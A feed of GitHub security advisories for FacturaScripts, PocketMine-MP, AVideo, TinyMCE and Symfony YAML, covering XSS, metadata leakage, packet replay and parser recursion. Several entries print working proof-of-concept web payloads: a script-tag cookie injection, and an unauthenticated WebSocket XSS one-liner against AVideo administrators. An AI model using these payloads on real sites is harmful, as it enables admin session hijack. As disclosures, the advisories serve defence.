  • https://github.com/adminneo-org/adminneo/releases/tag/v5.5.0
  • https://github.com/advisories/GHSA-jm85-8cpp-9cjc

entry.title: [facturascripts/facturascripts] FacturaScripts vulnerable to Reflected Cross-Site Scripting (XSS) via Cookie Manipulation
entry.content:
Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the fsNick cookie parameter. The application reflects the cookie's value directly into the HTML without sanitization.

Details

The fsNick cookie is rendered into the DOM without encoding. While the server does reject the modified session and forces a logout, the HTML containing the payload reaches the browser first. This lets the script execute immediately upon load, effectively beating the redirect.

PoC

  1. Log in to the application with any valid account.

  2. Capture any the GET request .

  3. Modify the value of "fsNick" with the following JavaScript: <script>alert(window.origin)</script>

  4. Send the modified request.

  5. Result

Impact

The payload executes before the session ends, which could potentially allow for a single unauthorized action before the logout.

entry.title: [facturascripts/facturascripts] FacturaScripts Vulnerable to Unstripped Image Metadata (EXIF) Leakage via Library Module File Upload/Download
entry.content:
Summary

Fectura Scripts is an open-source ERP application, a sensitive information disclosure vulnerability was identified in the Library module's image upload and download pipeline. The application fails to strip EXIF and other embedded metadata from user-uploaded image files before storing them and serving them for download. As a result, any authenticated user who downloads an image from the Library can extract the original uploader's GPS coordinates, device information, timestamps, embedded comments/notes, thumbnail previews, and other personally identifiable information (PII) preserved in the image metadata.

This vulnerability carries significant real-world impact: an employee uploading a photo taken at their home inadvertently discloses their precise home address to every user with Library download access.

Affected Functionality Overview

Fectura Scripts exposes image upload capabilities across several modules (e.g., email composition, profile settings, etc.). During testing, the Library section was identified as the only module that provides:

  • Full image upload (unrestricted image types observed)
  • Persistent storage of uploaded files
  • Direct download capability for any authenticated user with access
  • No server-side metadata sanitization at any point in the pipeline (upload, storage, or delivery)

Other modules (e.g., email attachments) were also tested but either did not render images or had limited upload/download exposure.

Technical Background

What Is EXIF/Image Metadata?

Most modern image formats (JPEG, TIFF, PNG with ancillary chunks, HEIC, WebP with XMP) embed metadata automatically at creation time. This metadata can include:

Metadata Category Example Fields Privacy Risk
GPS / Geolocation GPSLatitude, GPSLongitude, GPSAltitude, GPSTimestamp Critical — reveals exact physical location
Device Information Make, Model, Software, LensModel Medium — device fingerprinting
Timestamps DateTimeOriginal, CreateDate, ModifyDate Medium — behavioral profiling
User Comments UserComment, ImageDescription, XPComment, XPAuthor High — may contain names, notes, PII
Thumbnails ThumbnailImage (embedded JPEG preview) High — may preserve original uncropped image
Serial Numbers BodySerialNumber, LensSerialNumber, InternalSerialNumber Medium — unique device tracking
Network/Software HostComputer, Software, ProcessingSoftware Low–Medium — infrastructure disclosure
XMP / IPTC Creator, Rights, Description, Keywords Medium — organizational/authorship leakage

Why This Matters in an ERP Context

ERP platforms are used by businesses with multiple employees, contractors, clients, and sometimes external partners accessing shared resources. The Library module is inherently a collaborative, shared-access feature. Any image uploaded by one party is downloadable by many others — creating a one-to-many PII exposure vector.

Step-by-Step Reproduction

Prerequisites

  • A valid user account with access to the Library module (tested with Admin role; lower-privilege roles should also be tested)
  • A test image file containing rich EXIF/metadata (see Step 1)
  • An EXIF analysis tool: exiftool (CLI), or any online EXIF viewer

Step 1: Prepare a Metadata-Rich Test Image

Create or obtain a JPEG image with embedded GPS and descriptive metadata. You can inject test metadata using exiftool:

exiftool \
  -GPSLatitude="48.8566" \
  -GPSLatitudeRef="N" \
  -GPSLongitude="2.3522" \
  -GPSLongitudeRef="E" \
  -GPSAltitude="35" \
  -UserComment="Confidential: Taken at employee home address" \
  -XPAuthor="John Doe" \
  -Make="Apple" \
  -Model="iPhone 15 Pro Max" \
  -DateTimeOriginal="2025:01:15 09:30:00" \
  test_image.jpg

Verify metadata is present:

exiftool test_image.jpg

Expected output should show all injected fields including GPS coordinates resolving to Paris, France (48.8566°N, 2.3522°E).

Step 2: Log in to Fectura Scripts

  1. Navigate to the Fectura Scripts login page.
  2. Authenticate with valid credentials.
  3. Confirm access to the application dashboard.

Step 3: Navigate to the Library Section

  1. From the main navigation/sidebar, click on "Library" (or equivalent menu entry).
  2. Confirm the Library module loads and displays existing files/images (if any).

Step 4: Upload the Test Image

  1. Click the "Upload" button/action within the Library interface.
  2. Select the prepared test_image.jpg file.
  3. Complete the upload process (fill any required fields such as title/description if prompted).
  4. Confirm the image appears in the Library listing.

Step 5: Download the Image (as the Same or Different User)

  1. Locate the uploaded image in the Library.
  2. Click the "Download" button/link (or right-click → Save As on the rendered image, depending on UI).
  3. Save the file locally as downloaded_image.jpg.

Note: For stronger proof of impact, perform this step logged in as a different user account with Library access, demonstrating cross-user information leakage.

Step 6: Extract and Analyze Metadata from the Downloaded File

Run exiftool on the downloaded file:

exiftool downloaded_image.jpg

Observed Result (Vulnerable):

GPS Latitude                    : 48 deg 51' 23.76" N
GPS Longitude                   : 2 deg 21' 7.92" E
GPS Altitude                    : 35 m
GPS Position                    : 48.8566°N, 2.3522°E
User Comment                    : Confidential: Taken at employee home address
XP Author                       : John Doe
Make                            : Apple
Model                           : iPhone 15 Pro Max
Date/Time Original              : 2025:01:15 09:30:00
...
[ALL original metadata preserved in full]

Expected Result (Secure):

All EXIF, XMP, IPTC, GPS, and comment fields should be stripped or neutralized before storage or at download time. Only essential image rendering data should remain.

Step 7: Confirm GPS Resolution to Physical Location

Take the extracted GPS coordinates and resolve them:

https://www.google.com/maps?q=48.8566,2.3522

This confirms the metadata resolves to a precise, real-world physical location — demonstrating the severity of the leak.

Root Cause Analysis

The application's image upload handler in the Library module stores the uploaded file byte-for-byte without any server-side processing to remove metadata. The download handler then serves the identical file. At no point in the pipeline is any of the following performed:

  1. EXIF stripping (e.g., via libraries like Intervention Image, Imagick::stripImage(), Python Pillow's .save() without EXIF, or jpegtran -copy none)
  2. Re-encoding / reprocessing of the image (which would naturally discard non-image data)
  3. Selective metadata whitelisting (preserving only color profile / orientation data)
  4. Content-Disposition header enforcement to prevent inline rendering with metadata intact

This is a design-level omission rather than a bypassable control — there is simply no metadata handling logic present.

Impact Assessment

Direct Impacts

Impact Description Severity
Geolocation Disclosure GPS coordinates in uploaded photos can reveal home addresses, office locations, client sites, travel patterns of employees High
PII Leakage Author names, comments, device owner names embedded in metadata expose personal identity High
Device Fingerprinting Camera make/model, serial numbers, and software versions enable tracking and targeting of specific individuals or devices Medium
Behavioral Profiling Timestamps and sequential GPS data across multiple uploads can reconstruct an individual's movements and schedule High
Embedded Thumbnail Leakage Thumbnails may preserve the original uncropped image, potentially exposing content the user intentionally cropped out (documented in prior CVEs) Medium–High

Contextual / Escalated Impacts

  • Regulatory Exposure: GPS coordinates and author names constitute personal data under GDPR (Art. 4(1)), CCPA, and similar frameworks. Failure to strip this data from shared/downloadable resources may constitute a data protection violation for organizations using Fectura Scripts.
  • Insider Threat Amplification: A malicious insider (employee, contractor) with Library download access can silently harvest geolocation and identity data of colleagues without any logging or indication to the victim.
  • Physical Security Risk: In sectors where employee physical safety is paramount (e.g., legal, law enforcement, journalism, NGOs, domestic violence support), leaking home GPS coordinates through an ERP system represents a direct physical safety threat.
  • Supply Chain Risk: If the Library is shared with external partners/vendors, the exposure surface extends beyond the organization.

Why CVSS 6.5 Understates the Risk

The CVSS base score of 6.5 reflects the mechanical characteristics of the vulnerability (network-accessible, low complexity, authenticated). However, the contextual severity is higher because:

  1. Users have no expectation that uploading an image to an ERP system will broadcast their home coordinates.
  2. The attack is completely passive — the attacker simply downloads a file; no exploitation toolkit or special skills are required.
  3. The leaked data (GPS, PII) is irrevocable — once downloaded, the victim cannot "un-leak" their location.
  4. The vulnerability affects every image ever uploaded to the Library, creating a retroactive exposure of historical data.

Recommended effective severity: HIGH for any deployment handling real employee/client data.

Recommended Remediation

Immediate (Short-Term)

Priority Action
P0 Implement server-side EXIF/metadata stripping on all image uploads in the Library module before storage.
P0 Retroactively strip metadata from all existing images already stored in the Library.
P1 Extend metadata stripping to all other upload endpoints across the application (email attachments, profile photos, product images, etc.).

Implementation Guidance (by Language/Stack)

PHP (likely stack for Fectura Scripts):

// Using GD (built-in, no dependencies)
function stripMetadata($sourcePath, $destPath) {
    $image = imagecreatefromjpeg($sourcePath);
    imagejpeg($image, $destPath, 95); // Re-encodes, discarding all EXIF
    imagedestroy($image);
}

// Using Imagick (if available)
$img = new Imagick($sourcePath);
$img->stripImage(); // Removes all EXIF, IPTC, XMP profiles
$img->writeImage($destPath);

Python:

from PIL import Image
img = Image.open("uploaded.jpg")
data = list(img.getdata())
clean = Image.new(img.mode, img.size)
clean.putdata(data)
clean.save("clean.jpg")

Command-line (for retroactive cleanup):

# Strip all metadata from all JPEGs in the library storage directory
exiftool -all= -overwrite_original /path/to/library/uploads/*.jpg

Long-Term (Architectural)

Priority Action
P1 Establish a centralized file upload processing pipeline that all modules route through, ensuring consistent sanitization.
P1 Add Content Security Policy and Content-Disposition: attachment headers on all file downloads to reduce inline rendering risks.
P2 Implement a configurable metadata policy (e.g., allow admins to choose between full strip, preserve orientation only, or preserve color profile).
P2 Add file type validation (magic byte checking, not just extension) to the upload pipeline.
P3 Consider adding a user-facing warning at upload time: "Note: Image metadata will be stripped for privacy."

9. References

Resource URL
CWE-200: Exposure of Sensitive Information https://cwe.mitre.org/data/definitions/200.html
CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer https://cwe.mitre.org/data/definitions/212.html
NIST NVD CVSS v3.1 Calculator https://www.first.org/cvss/calculator/3.1
GDPR Art. 4(1) — Definition of Personal Data https://gdpr-info.eu/art-4-gdpr/
ExifTool by Phil Harvey https://exiftool.org/
Related CVE https://nvd.nist.gov/vuln/detail/CVE-2023-29850

11. Conclusion

The absence of image metadata sanitization in Fectura Scripts' Library module is a clear, easily exploitable, and high-impact information disclosure vulnerability. It requires no technical skill to exploit (just a file download and a free tool), it leaks data that users never intended to share (home GPS coordinates, personal identity), and it affects every image ever uploaded to the platform retroactively.

While the CVSS base score of 6.5 categorizes this as "Medium," the real-world privacy consequences — particularly under GDPR and in contexts where physical safety is relevant — warrant treating this with High urgency. entry.title: [pocketmine/pocketmine-mp] PocketMine-MP has potential memory/network vulnerability from repeated ResourcePackClientResponsePacket packets
entry.content:
Summary

During the resource pack stage of logging in, after the server sends ResourcePackStackPacket, a malicious client can send a batch of multiple ResourcePackClientResponsePacket packets with status ResourcePackClientResponsePacket::STATUS_COMPLETED causing the server to repeatedly execute pre-spawn progression.

Impact

Multiple Player objects can be created for just a single session, increasing memory usage and amplifying outbound network traffic from duplication of large pre-spawn packets such as AvailableCommandsPacket and CreativeContentPacket.

Workarounds

Plugins can use their own PacketHandler classes that reject/ignore any extra ResourcePackClientResponsePacket packets.

Patches

This issue was patched in https://github.com/pmmp/PocketMine-MP/commit/7a27894146a04964ab628ed9033140fdbf887ff3 and released in 5.44.2.

entry.title: [WWBN/AVideo] WWBN AVideo: Unauthenticated Stored DOM Cross-Site Scripting via Per-Client Metadata Broadcast in YPTSocket Plugin
entry.content:
Summary

A stored DOM Cross-Site Scripting vulnerability (CWE-79) in the AVideo YPTSocket plugin lets any unauthenticated remote attacker execute arbitrary JavaScript in the authenticated origin of every administrator currently viewing a page that renders the YPTSocket online-users debug panel. plugin/YPTSocket/getWebSocket.json.php issues a signed WebSocket token to any anonymous caller, and MessageSQLiteV2::onOpen at plugin/YPTSocket/MessageSQLiteV2.php lines 91 and 110 reads the attacker-controlled webSocketSelfURI and page_title query parameters from the WebSocket connection URL with no validation. Both values persist into the in-memory SQLite connections table and broadcast inside the users_id_online array sent to every connected client; on the client, plugin/YPTSocket/script.js::updateSocketUserCard interpolates the broadcast page_title into an HTML template literal that is passed to jQuery $.append(html), which parses attacker bytes into live DOM nodes including <img> with inline event handlers.

Details

plugin/YPTSocket/getWebSocket.json.php issues a WebSocket token to any caller; the only gate is AVideoPlugin::isEnabledByName("YPTSocket"). The token-issuance helper getEncryptedInfo() at plugin/YPTSocket/functions.php:21-24 writes $_REQUEST['webSocketSelfURI'] directly into the per-token state without validation:

// plugin/YPTSocket/functions.php:21-24
if (!empty($_REQUEST['webSocketSelfURI'])) {
    $msgObj->selfURI = $_REQUEST['webSocketSelfURI'];
} else {
    $msgObj->selfURI = getSelfURI();
}

On WebSocket open, MessageSQLiteV2::onOpen reads webSocketSelfURI and page_title from the connection URL query string and persists both verbatim into the in-memory SQLite connections table:

// plugin/YPTSocket/MessageSQLiteV2.php:91 and :110
$client['selfURI']    = $wsocketGetVars['webSocketSelfURI'];        // line 91
$client['page_title'] = @utf8_encode(@$wsocketGetVars['page_title']); // line 110

utf8_encode is not an HTML encode. The broadcast helper dbGetUniqueUsers() (plugin/YPTSocket/db.php:288-300) selects both columns without escape and returns them as part of users_id_online, which msgToResourceId() at MessageSQLiteV2.php:444 places in the outbound JSON frame sent to every connected client. JSON encoding escapes " to \" for transport, but the receiving browser's JSON.parse(event.data) reverses the escape and restores the raw HTML bytes before they reach script.js.

On the client, plugin/YPTSocket/script.js::updateSocketUserCard (lines 638 to 700) interpolates the broadcast page_title into an HTML template literal and passes the result to jQuery $.append(html):

// plugin/YPTSocket/script.js:685-691
if (userData.page_title) textParts.push(userData.page_title);
const finalText = textParts.join(' ');
const html = `<a href="${selfURI}" target="_blank" ...>
                <i class="far fa-compass"></i> ${finalText}
              </a>`;
$(`#${socketUserDivID} .socketUserPages`).append(html);  // sink

jQuery's .append(html) parses the string with the browser HTML parser, building live DOM nodes for any tag the attacker supplied, including <img> with inline event handlers. The browser's load attempt on the attacker-supplied src fails and the inline onerror event handler fires synchronously inside the admin's authenticated origin.

The victim precondition is that the YPTSocket online-users debug panel (#socketUsersURI) is rendered in the admin's DOM. plugin/YPTSocket/footer.php:12 renders the panel when User::isAdmin() && !empty($obj->debugSocket). The debugSocket plugin flag is true by default after enable, so any admin viewing any logged-in AVideo page with the standard YPTSocket footer holds a live broadcast subscription.

Affected product: AVideo (WWBN), YPTSocket plugin Tested version: master branch (snapshot dated 2026-05-22)

PoC

The AVideo deployment must have the YPTSocket plugin enabled (the default after enable) with debugSocket=true (the default), and at least one administrator must currently be viewing a page that loads the YPTSocket footer (any logged-in AVideo page does). The attacker requires only network reachability to getWebSocket.json.php over HTTPS and to the WebSocket TLS port.

Open DevTools Console on any browser tab pointed at the AVideo origin and paste the following one-liner. No authentication and no session cookie are required for the attacker side:

(async () => {
  const PAYLOAD = '<img src=q onerror="document.body.style.backgroundColor=String.fromCharCode(114,101,100);document.title=String.fromCharCode(80,87,78,69,68)">';
  const r = await fetch('/plugin/YPTSocket/getWebSocket.json.php?webSocketSelfURI=' + encodeURIComponent('/dashboard?x=1'));
  const j = await r.json();
  const u = j.webSocketURL
          + '&webSocketSelfURI=' + encodeURIComponent('/dashboard?x=1')
          + '&page_title='       + encodeURIComponent(PAYLOAD);
  const ws = new WebSocket(u);
  ws.onopen    = () => console.log('attacker connected');
  ws.onmessage = e => console.log('attacker frame:', e.data.slice(0, 200));
})();

The payload uses String.fromCharCode to spell its side-effect strings (String.fromCharCode(114,101,100) decodes to red; String.fromCharCode(80,87,78,69,68) decodes to PWNED) so no quote, backtick, or backslash bytes appear in transit. Within one server broadcast cycle, every administrator tab currently rendering the YPTSocket debug panel turns its page background red and changes its browser tab title to PWNED. Both side-effects are produced by attacker JavaScript executing inside the admin's authenticated AVideo origin.

Impact

This is a stored DOM Cross-Site Scripting vulnerability (CWE-79) in the AVideo YPTSocket plugin. An unauthenticated remote attacker who can reach the YPTSocket endpoints plants the payload by issuing one anonymous HTTP GET to getWebSocket.json.php followed by one anonymous WebSocket frame carrying the malicious page_title. The attacker JavaScript executes inside the admin's authenticated AVideo origin and can read non-HttpOnly cookies and the CSRF token rendered into the admin dashboard, issue authenticated requests to any admin-only endpoint, exfiltrate the admin dashboard DOM, and chain into any admin-context mutation. When the victim is an AVideo administrator, the attacker turns a single anonymous WebSocket connection into full administrative takeover via the admin's own session.

entry.title: [tinymce/tinymce] TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` serialization
entry.content:
Impact

Stored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via elements crafted through the data-mce-object attribute, which are created and executed before sanitization. Impacts users of TinyMCE with the media plugin enabled.

Patches

This vulnerability has been patched in TinyMCE 8.9.3 and TinyMCE 7.9.4 by ensuring that, when using the media plugin, any content created through the data-mce-object attribute is properly sanitized first.

Workarounds

No official workaround available.

Fix

To avoid this vulnerability:

Upgrade to TinyMCE 8.9.3 or higher. Upgrade to TinyMCE 7.9.4 or higher.

Acknowledgements

Tiny thanks Fariskhi Vidyan and David Vieira Kurz (HiSolutions AG) for their help identifying this vulnerability.

entry.title: [symfony/yaml] Symfony: Unbounded Recursion in the YAML Inline Lexer Lets a Single Document Crash the Process
entry.content:
Description

Yaml\Parser::lexInlineStructure() recursed through lexInlineMapping() and lexInlineSequence() for every { and [ of an inline collection, without entering the nesting level that the rest of the parser bounds with maxNestingLevel. A document made of deeply nested inline collections, such as [[[[...]]]], exhausted the stack while it was being lexed: depending on the PHP version and its stack settings, the process crashed or the request ended with a fatal error.

Any code parsing untrusted YAML is affected. That includes #[MapRequestPayload] when the Yaml component is installed and the endpoint does not restrict acceptFormat: a single unauthenticated request with a YAML content type is enough.

Resolution

The inline lexer now enters and leaves the same nesting level as the rest of the parser, so nested inline collections are bounded by maxNestingLevel, and the parser raises a ParseException beyond it.

The patches for this issue are available here for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

Credits

We would like to thank Nicolas Grekas for reporting the issue and providing the fix.
